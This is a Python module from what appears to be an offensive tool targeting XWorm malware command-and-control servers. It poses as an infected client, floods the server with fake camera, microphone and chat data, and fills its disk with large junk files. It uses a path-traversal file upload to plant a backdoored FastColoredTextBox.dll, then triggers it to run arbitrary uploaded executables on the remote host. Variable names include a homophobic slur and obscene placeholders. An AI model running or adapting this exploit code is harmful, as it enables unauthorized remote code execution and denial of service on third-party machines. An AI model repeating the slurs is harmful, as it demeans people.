import sys
sys.path.append('lib/jproto')

from jproto import *
from .helpers import *

import time
import random
import socket

def send_xworm_info(p):
    pack = b"INFO"
    
    uname = b'penis'
    comp_inf = b"windows 10 32bit"
    groub = b'XWorm V5.6'
    date  = b'22/12/2024'
    spread= b'True'
    admin = b'True'
    CUM   = b'True'
    cpu   = b'Intel penis'
    gpu   = b'Nvidia penis'
    ram   = b'256 GB'
    av    = b'KasperskyFed'
    
    p.send(pack,p.id_,uname,comp_inf,groub,
                date,spread,admin,CUM,cpu,gpu,ram,av)
        
def get_args(io,config):
    return config["c2ip"],config["c2port"],config["c2_con_key"].encode()

def troll(config,io,args,cmds):
    '''
Send fake camera,chat and microphone data to C2
Argument is attack duration in seconds
E.g: troll 5
    '''
    io.check_arg("campic_path",config,rep="resources/fox.jpg")
    io.check_arg("sound",config,rep="resources/sound.wav")
    io.check_arg("text",config,rep="Your C2 is t.me/fox_society property!")
                
    c2ip,c2port,c2_con_key =get_args(io,config)
                
    t      =time.time()
    time_  =int(args[0])
                    
    i=0
    text   = config["text"].encode()
    
    campic = byte_cer((open(config["campic_path"],'rb').read()))
    sound  = byte_cer((open(config["sound"],'rb').read()))
    
    while time.time()-t < time_:
        p  = proto(c2ip,int(c2port),
                b'<Xwormmm>',io.log_win,c2_con_key)
        
        if i%3==0:
            p.send(b'Xchat',p.id_)
            p.send(b'ENCHAT',p.id_)
            p.send(b'Wchat',p.id_,text)

        if i%3==1:
            p.send(b'WBCM',text,p.id_)
            p.send(b'Cam',campic,p.id_)
                            
        if i%3==2:
            p.send(b'MICCM',text,p.id_)
            p.send(b'MICGET',sound,p.id_)
        time.sleep(0.4)
        i+=1
            
    io.log_win.print("Attack completed!")

def diskspacedos(config,io,args,cmds):
    '''
Spams with 0.5 GB files to C2.
It eats disk space
Argument is size of space to eat in gigabytes
E.g: dosdiskspace 10
    '''
    files = int(args[0])*2
    durov_is_faggot = byte_cer(b'kiddo'*100000000)
    c2ip,c2port,c2_con_key = get_args(io,config)
    
    for i in range(files):
        p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
        p.send(b'FileM',p.id_)
        p.send(b'downloadedfile',p.id_,durov_is_faggot,random.randbytes(10).hex().encode())
        time.sleep(4) #to let it decrypt,ungzip and write file

def init_poc_backdoor(config,io,args,cmds):
    '''
Replaces c2's FastColoredTextBox.dll with
resources/FastColoredTextBox_backdoor_poc.dll
    '''
    
    c2ip,c2port,c2_con_key = get_args(io,config)
    p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
    p.id_ = b'..'
    p.send( b'FileM',p.id_)
    p.send( b'downloadedfile',p.id_,
           byte_cer(open('resources/FastColoredTextBox_backdoor_poc.dll','rb'
            ).read()),b"FastColoredTextBox.dll")
    time.sleep(3)
    
def runbd(config,io,args,cmds):
    '''
Sends comand to run backdoored dll function
    '''
    c2ip,c2port,c2_con_key = get_args(io,config)
    p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
    p.send(b'Compiler',p.id_)
    io.log_win.print('Executed backdoor call')

def init_backdoor(config,io,args,cmds):
    '''
Install default or your backdoor to c2.
Eg:
init_backdoor
init_backdoor path/to/backdoor

Default backdoor path:
resources/FastColoredTextBox_backdoor.dll
    '''
    c2ip,c2port,c2_con_key = get_args(io,config)
    p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
    p.id_ = b'..'
    if len(args) == 0:   
        p.send( b'FileM',p.id_)
        p.send( b'downloadedfile',p.id_,
            byte_cer(open('resources/FastColoredTextBox_backdoor.dll','rb'
            ).read()),b"FastColoredTextBox.dll")
    else:
        data = open(args[0],'rb').read()
        p.send( b'downloadedfile',p.id_,byte_cer(data),b'FastColoredTextBox.dll')
    
    io.log_win.print(f'Uploaded backdoor to {c2ip}:{c2port}')    
    time.sleep(3)
    runbd(config,io,args,cmds)
    io.log_win.print(f'First bd call for creation hidden dir executed')

def send_execute_file(config,io,args,cmds):
    '''
Send and execute your local file at c2
E.g "send_execute_file path/to/local/file"
Needs inited backdoor at c2 before execution!
    '''
    c2ip,c2port,c2_con_key = get_args(io,config)
    file = open(args[0],'rb').read()
    p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
    p.id_ = b"XwormClientConfig"
    p.send( b'FileM',p.id_)
    p.send( b'downloadedfile',p.id_,byte_cer(file),b"runfile.exe")
    time.sleep(1)
    runbd(config,io,args,cmds)

def onconnect(config,io,args,cmds):
    '''
Waits until c2 is up and executes command
E.g
@onconnect init_backdoor
@onconnect beep
    '''
    c2ip,c2port = config["c2ip"],config["c2port"]
    i = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((c2ip,int(c2port)))
            if len(args) > 0:
                cmds[args[0]]['f'](config,io,args[1:],cmds)
            io.log_win.print(f"Connected {c2ip}:{c2port}")
            break
        except:
            pass

            
        time.sleep(1)
        i+=1

def onping(config,io,args,cmds):
    '''
Waits for ping command from server and executes commands
E.g
@onping init_backdoor
@onconnect beep
    '''
    onconnect(config,io,[],cmds)

    c2ip,c2port,c2_con_key = get_args(io,config)
    
    p = proto(c2ip,int(c2port),b'<Xwormmm>',io.log_win,c2_con_key)
    send_xworm_info(p)

    p.start_recver()
    p.send(b'PING!')
    while True:
        if p.events:
            if len(args) > 0:
                cmds[args[0]]['f'](config,io,args[1:],cmds)
            p.sock.close()
            io.log_win.print(f"Recved ping from {c2ip}:{c2port}")
            break
        time.sleep(0.2)
    

def_con_args = ["c2ip","c2port","c2_con_key"] #default args for connection
funcs = {"troll":{'f':troll,"arglen":1,"config_args":def_con_args},
         "dosdiskspace":{'f':diskspacedos,'arglen':1,"config_args":def_con_args},
         "init_poc_backdoor":{'f':init_poc_backdoor,"config_args":def_con_args},
         "runbd":{'f':runbd,"config_args":def_con_args},
         "init_backdoor":{'f':init_backdoor,"config_args":def_con_args},
         "send_execute_file":{'f':send_execute_file,'arglen':1,"config_args":def_con_args},
         "@onconnect":{'f':onconnect,"config_args":["c2ip","c2port"]},
         "@onping":{"f":onping,"config_args":def_con_args}}

submodules = {}
